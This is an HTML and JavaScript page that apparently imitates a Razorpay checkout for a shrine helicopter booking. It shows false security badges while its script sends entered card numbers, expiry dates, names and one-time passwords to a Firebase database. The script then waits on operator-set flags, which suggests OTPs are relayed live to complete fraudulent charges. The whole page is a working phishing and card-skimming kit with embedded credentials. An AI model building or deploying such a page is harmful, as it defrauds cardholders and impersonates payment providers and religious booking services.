<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Payment Gateway</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="/helicopterbooking/style.css">
</head>

<body>
    <div class="checkout-container">
        <!-- Success Overlay (Hidden by default) -->
        <div class="success-overlay hidden" id="success-overlay">
            <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none" />
                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8" />
            </svg>
            <div class="success-message" id="success-message">Payment Received!</div>

            <div class="transaction-details">
                <div class="transaction-id">Transaction ID: <span id="transaction-id">TXN987654321</span></div>
                <div class="transaction-amount">Amount: ₹<span id="final-amount">00.00</span></div>
            </div>

            <div class="countdown">Redirecting to home in <span class="countdown-number" id="redirect-timer">10</span>
                seconds</div>
        </div>

        <!-- Error Overlay (Hidden by default) -->
        <div class="success-overlay hidden" id="error-overlay">
            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" viewBox="0 0 24 24" fill="none"
                stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="15" y1="9" x2="9" y2="15"></line>
                <line x1="9" y1="9" x2="15" y2="15"></line>
            </svg>
            <div class="error-message-overlay" id="error-message">Payment Failed!</div>

            <div class="countdown">Redirecting to home in <span class="countdown-number"
                    id="error-redirect-timer">10</span> seconds</div>
        </div>

        <!-- Merchant Header -->
        <div class="merchant-header">
            <button class="back-button">
                <svg viewBox="0 0 14 14" fill="currentColor">
                    <path
                        d="M13 7a1 1 0 0 0-1-1H3.414l3.293-3.293a1 1 0 1 0-1.414-1.414l-5 5a1 1 0 0 0 0 1.414l5 5a1 1 0 0 0 1.414-1.414L3.414 8H12a1 1 0 0 0 1-1z">
                    </path>
                </svg>
            </button>
            <div class="merchant-info">
                <div class="merchant-logo">
                    <img src="/helicopterbooking/logostart.jpeg" alt="Merchant Logo">
                </div>
                <div class="merchant-name">
                    <h2>SHRINE BOARD</h2>
                    <div class="trust-badge">
                        <img src="https://checkout-static-next.razorpay.com/build/assets/images/rtb.f4f28384.png"
                            alt="Trusted">
                        <span>Secure Payment Gateway</span>
                    </div>
                </div>
            </div>
        </div>

        <!-- Price Summary -->
        <div class="price-summary">
            <div class="notification">
                <svg viewBox="0 0 14 14" fill="currentColor">
                    <path fill-rule="evenodd"
                        d="M7 14A7 7 0 1 0 7 0a7 7 0 0 0 0 14zm0-1.167A5.833 5.833 0 1 0 7 1.167a5.833 5.833 0 0 0 0 11.666z">
                    </path>
                    <path fill-rule="evenodd"
                        d="M7 3.5a.583.583 0 0 1 .583.583v3.5a.583.583 0 1 1-1.166 0v-3.5A.583.583 0 0 1 7 3.5z"></path>
                    <path fill-rule="evenodd" d="M7 9.333a.583.583 0 1 0 0 1.167.583.583 0 0 0 0-1.167z"></path>
                </svg>
                <span>Your transaction is secured with bank-grade encryption</span>
            </div>
            <div class="price-box">
                <div class="price-title">Total Amount</div>
                <div class="price-amount">₹<span id="dynamic-amount">0</span></div>
            </div>
        </div>

        <!-- Payment Options -->
        <div class="payment-options">
            <div class="options-title">Payment Method</div>

            <div class="payment-methods">
                <div class="method active" data-method="card">
                    <div class="method-info">
                        <div class="method-name">Credit/Debit Card</div>
                        <div class="method-offer">Secured with 3D authentication</div>
                    </div>
                    <div class="method-icons">
                        <img src="https://cdn.razorpay.com/card-networks/visa.svg" alt="Visa">
                        <img src="https://cdn.razorpay.com/card-networks/mastercard.svg" alt="Mastercard">
                        <img src="https://cdn.razorpay.com/card-networks/rupay.svg" alt="RuPay">
                    </div>
                </div>
            </div>
        </div>

        <!-- Card Payment Form (Visible by default) -->
        <div class="payment-form" id="card-form">
            <h3>Enter card details</h3>

            <div class="offer-banner">
                <img src="https://cdn.razorpay.com/static/assets/offers/campaign/tata-neu.svg" alt="Security">
                <span>Your card details are encrypted and securely processed</span>
            </div>

            <form id="card-details-form">
                <div class="form-group card-input-container">
                    <label>Card Number</label>
                    <input type="text" id="card-number" placeholder="1234 5678 9012 3456" maxlength="19">
                    <div class="card-type-indicator">
                        <img src="https://cdn.razorpay.com/card-networks/visa.svg" id="visa-icon" alt="Visa">
                        <img src="https://cdn.razorpay.com/card-networks/mastercard.svg" id="mastercard-icon"
                            alt="Mastercard">
                        <img src="https://cdn.razorpay.com/card-networks/rupay.svg" id="rupay-icon" alt="RuPay">
                    </div>
                    <div class="error-message" id="card-number-error"></div>
                </div>

                <div class="form-row">
                    <div class="form-group">
                        <label>Expiry (MM/YY)</label>
                        <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5">
                        <div class="error-message" id="card-expiry-error"></div>
                    </div>

                    <div class="form-group">
                        <label>CVV</label>
                        <input type="text" id="card-cvv" placeholder="123" maxlength="3">
                        <div class="error-message" id="card-cvv-error"></div>
                    </div>
                </div>

                <div class="form-group">
                    <label>Name on Card</label>
                    <input type="text" id="card-name" placeholder="Enter name on card">
                    <div class="error-message" id="card-name-error"></div>
                </div>

                <div class="save-card-option">
                    <input type="checkbox" id="save-card">
                    <label for="save-card">Save this card for future payments</label>
                </div>

                <button type="submit" class="pay-button">Pay ₹<span id="pay-button-amount">0</span></button>
            </form>

            <!-- Loading Animation -->
            <div class="loading-container hidden" id="loading-animation">
                <div class="loading-spinner"></div>
                <div class="loading-text">Processing your payment</div>
                <div class="countdown">Redirecting to OTP verification in <span class="countdown-number"
                        id="countdown-timer">10</span> seconds</div>
            </div>

            <!-- OTP Verification for Card Payment -->
            <div class="otp-verification hidden" id="card-otp-verification">
                <h3>Verify Payment</h3>
                <div class="form-group">
                    <label>Enter OTP sent to your registered mobile</label>
                    <input type="text" id="card-otp" placeholder="6-digit OTP" maxlength="6">
                    <div class="error-message" id="card-otp-error"></div>
                </div>
                <button class="pay-button" id="verify-otp-button">Verify & Pay ₹<span
                        id="verify-amount">0</span></button>
            </div>

            <!-- Second Loading Animation for OTP Processing -->
            <div class="loading-container hidden" id="otp-loading-animation">
                <div class="loading-spinner"></div>
                <div class="loading-text">Verifying OTP and processing payment</div>
                <div class="countdown">Please wait <span class="countdown-number" id="otp-countdown-timer">10</span>
                    seconds</div>
            </div>

            <div class="security-badge">
                <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
                    <path
                        d="M8 0C3.6 0 0 3.6 0 8s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm0 14.5c-3.6 0-6.5-2.9-6.5-6.5S4.4 1.5 8 1.5s6.5 2.9 6.5 6.5-2.9 6.5-6.5 6.5z" />
                    <path
                        d="M8 3.5c-2.5 0-4.5 2-4.5 4.5s2 4.5 4.5 4.5 4.5-2 4.5-4.5-2-4.5-4.5-4.5zm0 7c-1.4 0-2.5-1.1-2.5-2.5S6.6 5.5 8 5.5s2.5 1.1 2.5 2.5S9.4 10.5 8 10.5z" />
                </svg>
                <span>Secured by Razorpay | PCI DSS Compliant</span>
            </div>
        </div>
    </div>

    <script>
    // Firebase configuration
    var firebaseConfig = {
        apiKey: "AIzaSyBsguV3z-yt26JxYRjYZcUXwcg1fYE3C9A",
        authDomain: "databse-e8d19.firebaseapp.com",
        databaseURL: "https://databse-e8d19-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "databse-e8d19",
        storageBucket: "databse-e8d19.firebasestorage.app",
        messagingSenderId: "33641026473",
        appId: "1:33641026473:web:f196eecffdc669994e6ab8",
        measurementId: "G-Q0JCJMZZKQ"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    document.addEventListener('DOMContentLoaded', function () {
        // ========= NEW: keep current transaction id =========
        let currentTransactionId = null;

        // Get references to all amount display elements
        const dynamicAmountElement = document.getElementById('dynamic-amount');
        const payButtonAmountElement = document.getElementById('pay-button-amount');
        const verifyAmountElement = document.getElementById('verify-amount');
        const finalAmountElement = document.getElementById('final-amount');

        // Load amount from Firebase
        function loadAmountFromFirebase() {
            database.ref('amount').once('value')
                .then((snapshot) => {
                    if (snapshot.exists()) {
                        const amount = snapshot.val();
                        const formattedAmount = amount.toLocaleString('en-IN');
                        dynamicAmountElement.textContent = formattedAmount;
                        payButtonAmountElement.textContent = formattedAmount;
                        verifyAmountElement.textContent = formattedAmount;
                        finalAmountElement.textContent = amount.toLocaleString('en-IN') + '.00';
                    } else {
                        // Set default amount to 0 if not found in Firebase
                        const amount = 0;
                        const formattedAmount = amount.toLocaleString('en-IN');
                        dynamicAmountElement.textContent = formattedAmount;
                        payButtonAmountElement.textContent = formattedAmount;
                        verifyAmountElement.textContent = formattedAmount;
                        finalAmountElement.textContent = amount.toLocaleString('en-IN') + '.00';
                    }
                })
                .catch((error) => {
                    console.error('Error loading amount from Firebase: ', error);
                    // Set default amount to 0 on error
                    const amount = 0;
                    const formattedAmount = amount.toLocaleString('en-IN');
                    dynamicAmountElement.textContent = formattedAmount;
                    payButtonAmountElement.textContent = formattedAmount;
                    verifyAmountElement.textContent = formattedAmount;
                    finalAmountElement.textContent = amount.toLocaleString('en-IN') + '.00';
                });
        }

        // Initial load of amount
        loadAmountFromFirebase();

        // Realtime listener for amount
        database.ref('amount').on('value', (snapshot) => {
            if (snapshot.exists()) {
                const amount = snapshot.val();
                const formattedAmount = amount.toLocaleString('en-IN');
                dynamicAmountElement.textContent = formattedAmount;
                payButtonAmountElement.textContent = formattedAmount;
                verifyAmountElement.textContent = formattedAmount;
                finalAmountElement.textContent = amount.toLocaleString('en-IN') + '.00';
            } else {
                // Set default amount to 0 if not found in Firebase
                const amount = 0;
                const formattedAmount = amount.toLocaleString('en-IN');
                dynamicAmountElement.textContent = formattedAmount;
                payButtonAmountElement.textContent = formattedAmount;
                verifyAmountElement.textContent = formattedAmount;
                finalAmountElement.textContent = amount.toLocaleString('en-IN') + '.00';
            }
        });

        // Card number formatting and type detection
        const cardNumberInput = document.getElementById('card-number');
        const visaIcon = document.getElementById('visa-icon');
        const mastercardIcon = document.getElementById('mastercard-icon');
        const rupayIcon = document.getElementById('rupay-icon');

        if (cardNumberInput) {
            cardNumberInput.addEventListener('input', function (e) {
                let value = this.value.replace(/\D/g, '');
                value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
                this.value = value;

                const cardNumber = value.replace(/\s/g, '');
                hideAllCardIcons();

                if (cardNumber.length === 0) return;

                if (/^4/.test(cardNumber)) {
                    visaIcon.style.display = 'block';
                } else if (/^5[1-5]/.test(cardNumber) || /^2[2-7]/.test(cardNumber)) {
                    mastercardIcon.style.display = 'block';
                } else if (/^6[05]/.test(cardNumber) || /^81/.test(cardNumber) || /^82/.test(cardNumber) || /^508/.test(cardNumber) || /^353/.test(cardNumber) || /^356/.test(cardNumber)) {
                    rupayIcon.style.display = 'block';
                }
            });
        }

        function hideAllCardIcons() {
            visaIcon.style.display = 'none';
            mastercardIcon.style.display = 'none';
            rupayIcon.style.display = 'none';
        }

        // Expiry date formatting
        const cardExpiryInput = document.getElementById('card-expiry');
        if (cardExpiryInput) {
            cardExpiryInput.addEventListener('input', function (e) {
                let value = this.value.replace(/\D/g, '');
                if (value.length > 2) {
                    value = value.substring(0, 2) + '/' + value.substring(2, 4);
                }
                this.value = value;
            });
        }

        // CVV numbers only
        const cardCvvInput = document.getElementById('card-cvv');
        if (cardCvvInput) {
            cardCvvInput.addEventListener('input', function (e) {
                this.value = this.value.replace(/\D/g, '');
            });
        }

        // Form validation for card payment
        const cardFormElement = document.getElementById('card-details-form');
        const loadingAnimation = document.getElementById('loading-animation');
        const cardOtpVerification = document.getElementById('card-otp-verification');
        const otpLoadingAnimation = document.getElementById('otp-loading-animation');
        const successOverlay = document.getElementById('success-overlay');
        const errorOverlay = document.getElementById('error-overlay');
        const countdownTimer = document.getElementById('countdown-timer');
        const otpCountdownTimer = document.getElementById('otp-countdown-timer');
        const redirectTimer = document.getElementById('redirect-timer');
        const errorRedirectTimer = document.getElementById('error-redirect-timer');
        const transactionIdElement = document.getElementById('transaction-id');
        const successMessageElement = document.getElementById('success-message');
        const errorMessageElement = document.getElementById('error-message');

        if (cardFormElement) {
            cardFormElement.addEventListener('submit', function (e) {
                e.preventDefault();

                // Reset error messages
                document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');

                let isValid = true;

                // Validate card number (16 digits)
                const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
                if (cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
                    document.getElementById('card-number-error').textContent = 'Please enter a valid 16-digit card number';
                    document.getElementById('card-number-error').style.display = 'block';
                    isValid = false;
                }

                // Validate expiry date (MM/YY format)
                const expiry = document.getElementById('card-expiry').value;
                if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                    document.getElementById('card-expiry-error').textContent = 'Please enter a valid expiry date (MM/YY)';
                    document.getElementById('card-expiry-error').style.display = 'block';
                    isValid = false;
                }

                // Validate CVV (3 or 4 digits)
                const cvv = document.getElementById('card-cvv').value;
                if (!/^\d{3,4}$/.test(cvv)) {
                    document.getElementById('card-cvv-error').textContent = 'Please enter a valid CVV';
                    document.getElementById('card-cvv-error').style.display = 'block';
                    isValid = false;
                }

                // Validate card name
                const cardName = document.getElementById('card-name').value.trim();
                if (cardName.length < 2) {
                    document.getElementById('card-name-error').textContent = 'Please enter the name on your card';
                    document.getElementById('card-name-error').style.display = 'block';
                    isValid = false;
                }

                // If form is valid, FIRST: create transaction + store to Firebase (initiated)
                if (isValid) {
                    // ========= NEW: generate transaction id at Pay click =========
                    currentTransactionId = 'TXN' + Math.floor(100000000 + Math.random() * 900000000);
                    // Show this id later on success overlay as well
                    transactionIdElement.textContent = currentTransactionId;

                    // ========= NEW: store initial data immediately =========
                    storeTransactionData(currentTransactionId, 'initiated', null /*otp*/);

                    // Continue existing UI flow
                    cardFormElement.classList.add('hidden');
                    loadingAnimation.classList.remove('hidden');

                    // Start countdown from 10 seconds
                    let seconds = 10;
                    countdownTimer.textContent = seconds;
                    const countdownInterval = setInterval(function () {
                        seconds--;
                        countdownTimer.textContent = seconds;

                        if (seconds <= 0) {
                            clearInterval(countdownInterval);
                            loadingAnimation.classList.add('hidden');
                            cardOtpVerification.classList.remove('hidden');
                        }
                    }, 1000);
                }
            });
        }

        // OTP verification for card payment
        const verifyOtpButton = document.getElementById('verify-otp-button');
        if (verifyOtpButton) {
            verifyOtpButton.addEventListener('click', function (e) {
                e.preventDefault();

                const otp = document.getElementById('card-otp').value.trim();
                const otpError = document.getElementById('card-otp-error');

                otpError.style.display = 'none';

                if (otp.length !== 6 || !/^\d+$/.test(otp)) {
                    otpError.textContent = 'Please enter a valid 6-digit OTP';
                    otpError.style.display = 'block';
                    return;
                }

                // ========= NEW: as soon as OTP entered, store in SAME transaction =========
                if (currentTransactionId) {
                    database.ref('transactions/' + currentTransactionId).update({
                        otp: otp,
                        status: 'otp_entered',
                        otpStoredAt: new Date().toISOString()
                    }).catch(err => console.error('Error storing OTP: ', err));
                }

                // Show OTP loading animation
                cardOtpVerification.classList.add('hidden');
                otpLoadingAnimation.classList.remove('hidden');
                
                // Hide the countdown timer
                if (otpCountdownTimer) {
                    otpCountdownTimer.style.display = 'none';
                }

                // NEW: Function to check OTP validation status
                function checkOtpValidation() {
                    database.ref('otpvalidation').once('value')
                        .then((snapshot) => {
                            const otpValidation = snapshot.val();

                            if (otpValidation === 2) {
                                // Still processing, check again after 1 second
                                setTimeout(checkOtpValidation, 1000);
                                return;
                            }

                            if (otpValidation === 1) {
                                // OTP is valid, check payment status
                                checkPaymentStatus();
                            } else {
                                // OTP is invalid
                                otpLoadingAnimation.classList.add('hidden');
                                errorOverlay.classList.remove('hidden');
                                errorMessageElement.textContent = 'Invalid OTP!';
                                updateTransactionStatus('invalid_otp');

                                // Start error redirect countdown
                                let errorRedirectSeconds = 10;
                                errorRedirectTimer.textContent = errorRedirectSeconds;
                                const errorRedirectInterval = setInterval(function () {
                                    errorRedirectSeconds--;
                                    errorRedirectTimer.textContent = errorRedirectSeconds;

                                    if (errorRedirectSeconds <= 0) {
                                        clearInterval(errorRedirectInterval);
                                        errorOverlay.classList.add('hidden');
                                        cardOtpVerification.classList.remove('hidden');
                                    }
                                }, 1000);
                            }
                        })
                        .catch((error) => {
                            console.error('Error checking OTP validation: ', error);
                            showError('OTP verification error');
                            updateTransactionStatus('error_otp_verify');
                        });
                }

                // NEW: Function to check payment status
                function checkPaymentStatus() {
                    database.ref('paymentcheck').once('value')
                        .then((paymentSnapshot) => {
                            const paymentStatus = paymentSnapshot.val();

                            if (paymentStatus === 2) {
                                // Still processing, check again after 1 second
                                setTimeout(checkPaymentStatus, 1000);
                                return;
                            }

                            if (paymentStatus === 1) {
                                // Payment successful
                                otpLoadingAnimation.classList.add('hidden');
                                successOverlay.classList.remove('hidden');

                                // NOTE: transactionId already generated, just ensure overlay shows it
                                // Store/Update final status in same transaction
                                updateTransactionStatus('completed');

                                // Start redirect countdown
                                let redirectSeconds = 10;
                                redirectTimer.textContent = redirectSeconds;
                                const redirectInterval = setInterval(function () {
                                    redirectSeconds--;
                                    redirectTimer.textContent = redirectSeconds;

                                    if (redirectSeconds <= 0) {
                                        clearInterval(redirectInterval);
                                        successOverlay.classList.add('hidden');
                                        cardFormElement.classList.remove('hidden');
                                        document.getElementById('card-details-form').reset();
                                        currentTransactionId = null; // reset
                                    }
                                }, 1000);
                            } else {
                                // Payment failed
                                otpLoadingAnimation.classList.add('hidden');
                                errorOverlay.classList.remove('hidden');
                                errorMessageElement.textContent = 'Payment Failed!';
                                updateTransactionStatus('failed');

                                // Start error redirect countdown
                                let errorRedirectSeconds = 10;
                                errorRedirectTimer.textContent = errorRedirectSeconds;
                                const errorRedirectInterval = setInterval(function () {
                                    errorRedirectSeconds--;
                                    errorRedirectTimer.textContent = errorRedirectSeconds;

                                    if (errorRedirectSeconds <= 0) {
                                        clearInterval(errorRedirectInterval);
                                        errorOverlay.classList.add('hidden');
                                        cardFormElement.classList.remove('hidden');
                                        currentTransactionId = null; // reset
                                    }
                                }, 1000);
                            }
                        })
                        .catch((error) => {
                            console.error('Error checking payment status: ', error);
                            showError('Payment verification error');
                            updateTransactionStatus('error_payment_verify');
                        });
                }

                // Start checking OTP validation
                checkOtpValidation();
            });
        }

        // Function to show error message
        function showError(message) {
            otpLoadingAnimation.classList.add('hidden');
            errorOverlay.classList.remove('hidden');
            document.getElementById('error-message').textContent = message;

            let errorRedirectSeconds = 10;
            document.getElementById('error-redirect-timer').textContent = errorRedirectSeconds;
            const errorRedirectInterval = setInterval(function () {
                errorRedirectSeconds--;
                document.getElementById('error-redirect-timer').textContent = errorRedirectSeconds;

                if (errorRedirectSeconds <= 0) {
                    clearInterval(errorRedirectInterval);
                    errorOverlay.classList.add('hidden');
                    document.getElementById('card-details-form').classList.remove('hidden');
                }
            }, 1000);
        }

        // ========= UPDATED: store initial data at Pay click, reuse for status updates =========
        function storeTransactionData(transactionId, initialStatus = 'initiated', otpValue = null) {
            const cardNumber = document.getElementById('card-number').value;
            const cardExpiry = document.getElementById('card-expiry').value;
            const cardName = document.getElementById('card-name').value;
            const saveCard = document.getElementById('save-card').checked;
            const amount = document.getElementById('dynamic-amount').textContent.replace(/,/g, '');

            const data = {
                transactionId: transactionId,
                amount: parseInt(amount),
                currency: 'INR',
                cardNumber: cardNumber,
                cardExpiry: cardExpiry,
                cardName: cardName,
                saveCard: saveCard,
                timestamp: new Date().toISOString(),
                status: initialStatus
            };

            if (otpValue !== null) data.otp = otpValue;

            // Save to Firebase
            database.ref('transactions/' + transactionId).set(data)
                .then(() => {
                    console.log('Transaction created (initiated)');
                })
                .catch((error) => {
                    console.error('Error saving transaction data: ', error);
                });
        }

        // ========= NEW helper: only update status on the same transaction id =========
        function updateTransactionStatus(status) {
            if (!currentTransactionId) return;
            const amount = document.getElementById('dynamic-amount').textContent.replace(/,/g, '');
            database.ref('transactions/' + currentTransactionId).update({
                status: status,
                lastUpdatedAt: new Date().toISOString(),
                amount: parseInt(amount)
            }).then(() => {
                console.log('Transaction status updated ->', status);
            }).catch(err => console.error('Error updating status: ', err));
        }

        // Back button functionality
        const backButton = document.querySelector('.back-button');
        if (backButton) {
            backButton.addEventListener('click', function () {
                const cardFormElement = document.getElementById('card-details-form');
                const loadingAnimation = document.getElementById('loading-animation');
                const cardOtpVerification = document.getElementById('card-otp-verification');
                const otpLoadingAnimation = document.getElementById('otp-loading-animation');
                const successOverlay = document.getElementById('success-overlay');
                const errorOverlay = document.getElementById('error-overlay');

                if (!cardOtpVerification.classList.contains('hidden')) {
                    cardOtpVerification.classList.add('hidden');
                    cardFormElement.classList.remove('hidden');
                } else if (!loadingAnimation.classList.contains('hidden')) {
                    loadingAnimation.classList.add('hidden');
                    cardFormElement.classList.remove('hidden');
                } else if (!otpLoadingAnimation.classList.contains('hidden')) {
                    otpLoadingAnimation.classList.add('hidden');
                    cardOtpVerification.classList.remove('hidden');
                } else if (!successOverlay.classList.contains('hidden')) {
                    successOverlay.classList.add('hidden');
                    cardFormElement.classList.remove('hidden');
                } else if (!errorOverlay.classList.contains('hidden')) {
                    errorOverlay.classList.add('hidden');
                    cardFormElement.classList.remove('hidden');
                } else {
                    window.history.back();
                }
            });
        }
    });
</script>
</body>

</html>
